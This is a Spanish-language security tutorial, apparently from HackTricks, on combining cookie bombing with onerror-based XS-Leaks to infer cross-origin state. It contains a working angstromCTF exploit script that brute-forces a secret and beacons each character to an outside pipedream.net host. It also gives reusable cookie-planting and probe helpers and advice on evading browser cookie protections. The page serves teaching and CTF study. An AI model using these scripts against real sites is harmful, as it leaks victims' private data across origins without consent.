# Cookie Bomb + Onerror XS Leak

{{#include ../../banners/hacktricks-training.md}}

Esta técnica combina:
- Cookie bombing: rellenar el navegador de la víctima con muchas/grandes cookies para el origen objetivo de modo que las solicitudes posteriores alcancen límites del servidor/solicitud (tamaño de request header, tamaño de URL en redirects, etc.).
- Error-event oracle: sondear un endpoint cross-origin con un `<script>` (u otro subrecurso) y distinguir estados con `onload` vs `onerror`.

Idea a alto nivel
- Encuentra un endpoint objetivo cuyo comportamiento difiera para dos estados que quieres probar (p. ej., búsqueda “hit” vs “miss”).
- Asegura que el camino “hit” dispare una cadena de redirects pesada o una URL larga mientras que el camino “miss” se mantenga corto. Infla los request headers usando muchas cookies para que solo el camino “hit” haga que el servidor falle con un error HTTP (p. ej., 431/414/400). El error invierte el evento onerror y se convierte en un oráculo para XS-Search.

¿Cuándo funciona esto?
- Puedes hacer que el navegador de la víctima envíe cookies al objetivo (p. ej., cookies con SameSite=None o puedes establecerlas en un contexto first-party vía un popup `window.open`).
- Hay una funcionalidad de la app que puedes abusar para establecer cookies arbitrarias (p. ej., endpoints de “save preference” que convierten entradas controladas en Set-Cookie) o para hacer post-auth redirects que incorporen datos controlados por el atacante en la URL.
- El servidor reacciona de forma distinta en los dos estados y, con headers/URL inflados, un estado cruza un límite y devuelve una respuesta de error que dispara onerror.

Nota sobre errores del servidor usados como oráculo
- 431 Request Header Fields Too Large se devuelve comúnmente cuando las cookies inflan los request headers; 414 URI Too Long o un 400 específico del servidor pueden devolverse para targets con URLs largas. Cualquiera de estos resulta en una carga fallida del subrecurso y dispara onerror. Consulta [MDN’s 431 entry](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431) para causas típicas como cookies excesivas.

<details>
<summary>Ejemplo práctico (angstromCTF 2022)</summary>

El siguiente script (de un public writeup) abusa de una feature que permite al atacante insertar cookies arbitrarias, luego carga un endpoint de búsqueda cross-origin como un `<script>`. Cuando la query es correcta, el servidor realiza un redirect que, junto con la cookie bloat, excede los límites del servidor y devuelve un estado de error, por lo que script.onerror se dispara; de lo contrario no pasa nada.
```html
<>'";
<form action="https://sustenance.web.actf.co/s" method="POST">
<input id="f" /><input name="search" value="a" />
</form>
<script>
const $ = document.querySelector.bind(document)
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
let i = 0
const stuff = async (len = 3500) => {
let name = Math.random()
$("form").target = name
let w = window.open("", name)
$("#f").value = "_".repeat(len)
$("#f").name = i++
$("form").submit()
await sleep(100)
}
const isError = async (url) => {
return new Promise((r) => {
let script = document.createElement("script")
script.src = url
script.onload = () => r(false)
script.onerror = () => r(true)
document.head.appendChild(script)
})
}
const search = (query) => {
return isError(
"https://sustenance.web.actf.co/q?q=" + encodeURIComponent(query)
)
}
const alphabet =
"etoanihsrdluc_01234567890gwyfmpbkvjxqz{}ETOANIHSRDLUCGWYFMPBKVJXQZ"
const url = "//en4u1nbmyeahu.x.pipedream.net/"
let known = "actf{"
window.onload = async () => {
navigator.sendBeacon(url + "?load")
await Promise.all([stuff(), stuff(), stuff(), stuff()])
await stuff(1600)
navigator.sendBeacon(url + "?go")
while (true) {
for (let c of alphabet) {
let query = known + c
if (await search(query)) {
navigator.sendBeacon(url, query)
known += c
break
}
}
}
}
</script>
```
</details>

¿Por qué el popup (`window.open`)?
- Los navegadores modernos están bloqueando cada vez más las third‑party cookies. Abrir una ventana de nivel superior hacia el objetivo hace que las cookies sean first‑party, por lo que las respuestas Set-Cookie del objetivo se mantienen, habilitando el paso de cookie-bomb incluso con restricciones sobre third‑party cookies.

2024–2025 notes on cookie availability
- El despliegue de Tracking Protection de Chrome (enero de 2024) ya está bloqueando third‑party cookies para una cohorte aleatoria y está previsto que se extienda a toda la base de usuarios una vez que el UK CMA lo apruebe; por tanto, asume que cualquier víctima puede perder de forma abrupta las 3P cookies. Automatiza la alternativa: detecta cuando tu sondeo de script falla sin llegar a golpear el objetivo y pivota de forma transparente al flujo popup/first‑party. Safari y Firefox ya bloquean la mayoría de third‑party cookies por defecto y CHIPS/partitioned cookies hacen que cada sitio top-level tenga ahora su propio contenedor.
- Usa un flujo de plantación de cookies first‑party (`window.open` + auto-submit a un cookie-setting endpoint) y luego sondea con un subresource que solo tiene éxito cuando esas cookies se envían. Si third‑party cookies están bloqueadas, mueve el sondeo a un contexto same-site (p. ej., ejecuta el oracle en el popup vía un gadget same-site y exfiltra el booleano con `postMessage` o un beacon a tu servidor), o inscribe el origin de la víctima en el Chrome’s deprecation trial si lo controlas legítimamente.

<details>
<summary>Helper de plantación first‑party seguro frente a Tracking Protection</summary>

When you need to stuff dozens of cookies from a cross-site context, stage a temporary top-level window and fire a series of oversized form submissions into the vulnerable Set-Cookie endpoint:
```js
async function plantFirstPartyCookies(endpoint, fields) {
for (let i = 0; i < 5; i++) {
const name = crypto.randomUUID();
const form = Object.assign(document.createElement('form'), {action:endpoint, method:'POST', target:name});
Object.entries(fields).forEach(([k, v]) => {
const input = document.createElement('input');
input.name = k;
input.value = v + '_'.repeat(400 + 120 * i);
form.appendChild(input);
});
document.body.appendChild(form);
window.open('about:blank', name, 'noopener');
form.submit();
await new Promise(r => setTimeout(r, 120));
form.remove();
}
}
```
</details>

Ayudante genérico de probing
Si ya dispones de una forma para establecer muchas cookies en el target origin (first-party), puedes reutilizar este minimal oracle contra cualquier endpoint cuyo success/failure conduzca a diferentes resultados de red (status/MIME/redirect):
```js
function probeError(url) {
return new Promise((resolve) => {
const s = document.createElement('script');
s.src = url;
s.onload = () => resolve(false);  // loaded successfully
s.onerror = () => resolve(true);  // failed (e.g., 4xx/5xx, wrong MIME, blocked)
document.head.appendChild(s);
});
}
```
Oráculo de etiquetas alternativo (stylesheet)
```js
function probeCSS(url) {
return new Promise((resolve) => {
const l = document.createElement('link');
l.rel = 'stylesheet';
l.href = url;
l.onload = () => resolve(false);
l.onerror = () => resolve(true);
document.head.appendChild(l);
});
}
```
Avanzado: de Bruijn–based cookie packing (CTF-proven)
- Cuando la app te permite controlar valores grandes de cookie, puedes empaquetar intentos de forma eficiente añadiendo una de Bruijn sequence a cada probe. Esto mantiene la sobrecarga por probe baja mientras garantiza que la rama pesada sea consistentemente más pesada solo para el prefijo correcto. Generador de ejemplo para |Σ| símbolos de longitud n (fits in a cookie value):
```js
const ALPH = '_{}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
function deBruijn(k, n, alphabet=ALPH){
const a = Array(k * n).fill(0), seq=[];
(function db(t,p){
if(t>n){ if(n%p===0) for(let j=1;j<=p;j++) seq.push(a[j]); }
else { a[t]=a[t-p]; db(t+1,p); for(let j=a[t-p]+1;j<k;j++){ a[t]=j; db(t+1,t);} }
})(1,1);
return seq.map(i=>alphabet[i]).join('');
}
```
- Idea en la práctica: establecer múltiples cookies cuyos valores sean prefijo + deBruijn(k,n). Solo cuando el prefijo probado es correcto el servidor toma la ruta pesada (por ejemplo, un redirect extra que refleja la cookie larga o la URL), lo que, combinado con el cookie bloat, supera los límites y activa onerror. Ver un solver público de LA CTF 2024 que usa este enfoque.

Tips to build the oracle
- Force the “positive” state to be heavier: chain an extra redirect only when the predicate is true, or make the redirect URL reflect unbounded user input so it grows with the guessed prefix.
- Inflate headers: repeat cookie bombing until a consistent error is observed on the “heavy” path. Servers commonly cap header size and will fail sooner when many cookies are present.
- Stabilize: fire multiple parallel cookie set operations and probe repeatedly to average out timing and caching noise.
- Bust caches and avoid pooling artifacts: add a random `#fragment` or `?r=` to probe URLs, and prefer distinct window names when using `window.open` loops.
- Alternate subresources: if `<script>` is filtered, try `<link rel=stylesheet>` or `<img>`. The onload/onerror boolean is the oracle; content never needs to be parsed.

Common header/URL limits (useful thresholds)
- Reverse proxies/CDNs and servers enforce different caps. As of October 2025, Cloudflare documents 128 KB total for request headers (and 16 KB URL) on the edge, so you may need more/larger cookies when targets sit behind it. Other stacks (e.g., Apache via LimitRequestFieldSize) are often closer to ~8 KB per header line and will hit errors earlier. Adjust bomb size accordingly (see [Cloudflare’s documented limit](https://developers.cloudflare.com/fundamentals/reference/connection-limits/)).

Browser hardening watchlist (2025+)
- Firefox 139/ESR 128.11 (May 2025) tightened script tag load/error accounting for cross-origin resources (CVE-2025-5266). On patched clients the `onerror` signal for certain redirected responses is suppressed, so diversify the oracle (parallel `<link rel=stylesheet>`, `<img>`, or `fetch` with mismatched MIME) and fingerprint the victim UA before assuming the boolean still fires.
- Expect enterprise Chromium builds with Tracking Protection or Fetch Metadata policies to intermittently strip cookies or rewrite redirects. Detect these cases by probing a short endpoint first; when it fails, automatically pivot to running the entire attack inside the popup and relaying bits through `postMessage`/`BroadcastChannel`.

Related XS-Search tricks
- URL length based oracles (no cookies needed) can be combined or used instead when you can force a very long request target:

{{#ref}}
url-max-length-client-side.md
{{#endref}}

Notes
- This class of attacks is discussed broadly as “Error Events” XS-Leaks. The cookie-bomb step is just a convenient way to push only one branch over server limits, producing a reliable boolean oracle.



## References
- XS-Leaks: Error Events (onerror/onload as an oracle): https://xsleaks.dev/docs/attacks/error-events/
- MDN: 431 Request Header Fields Too Large (común con muchas cookies): https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431
- Nota del writeup de LA CTF 2024 que muestra un de Bruijn cookie-bomb oracle: https://gist.github.com/arkark/5787676037003362131f30ca7c753627
- Cloudflare edge limits (URLs 16 KB, request headers 128 KB): https://developers.cloudflare.com/fundamentals/reference/connection-limits/
- Chrome Tracking Protection rollout details: https://blog.google/products/chrome/privacy-sandbox-tracking-protection/
- Mozilla MFSA 2025-44 (CVE-2025-5266) tightening script tag onerror behavior: https://www.mozilla.org/en-US/security/advisories/mfsa2025-44/
{{#include ../../banners/hacktricks-training.md}}
